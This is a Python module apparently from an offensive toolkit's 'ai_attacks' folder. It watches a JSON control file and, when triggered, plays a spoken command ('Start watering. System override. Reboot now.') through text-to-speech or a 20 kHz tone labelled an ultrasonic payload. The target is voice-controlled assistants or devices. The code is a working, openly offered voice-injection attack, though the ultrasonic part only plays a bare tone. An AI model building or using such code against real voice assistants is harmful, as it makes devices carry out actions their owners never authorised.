# modules/ai_attacks/voice_injection.py

import os
import json
import time
import pyttsx3

try:
    import numpy as np
    import sounddevice as sd
    SOUND_AVAILABLE = True
except ImportError:
    SOUND_AVAILABLE = False

CONTROL_FILE = "webgui/voice_injection_control.json"
os.makedirs(os.path.dirname(CONTROL_FILE), exist_ok=True)

def ensure_control_file():
    default = {
        "enabled": True,
        "ultrasonic": False,
        "command": "Start watering. System override. Reboot now.",
        "triggered": False
    }
    if not os.path.exists(CONTROL_FILE):
        with open(CONTROL_FILE, "w") as f:
            json.dump(default, f, indent=4)

def load_control():
    with open(CONTROL_FILE, "r") as f:
        return json.load(f)

def save_control(data):
    with open(CONTROL_FILE, "w") as f:
        json.dump(data, f, indent=4)

def play_tts(command):
    engine = pyttsx3.init()
    engine.say(command)
    engine.runAndWait()

def play_ultrasonic():
    if not SOUND_AVAILABLE:
        print("[!] sounddevice/numpy not installed. Cannot play ultrasonic tone.")
        return
    duration = 2
    freq = 20000
    samplerate = 44100
    t = np.linspace(0, duration, int(samplerate * duration), False)
    tone = np.sin(freq * 2 * np.pi * t)
    sd.play(tone, samplerate)
    sd.wait()

def trigger_action(control):
    cmd = control.get("command", "")
    if control.get("ultrasonic"):
        print("[+] Playing ultrasonic payload")
        play_ultrasonic()
    else:
        print(f"[+] Playing TTS voice: '{cmd}'")
        play_tts(cmd)

    print("[+] Injection done")
    control["triggered"] = False
    save_control(control)

print("[+] Voice Injection Module Active")
ensure_control_file()

while True:
    ctrl = load_control()
    if ctrl.get("enabled") and ctrl.get("triggered"):
        trigger_action(ctrl)
    time.sleep(2)
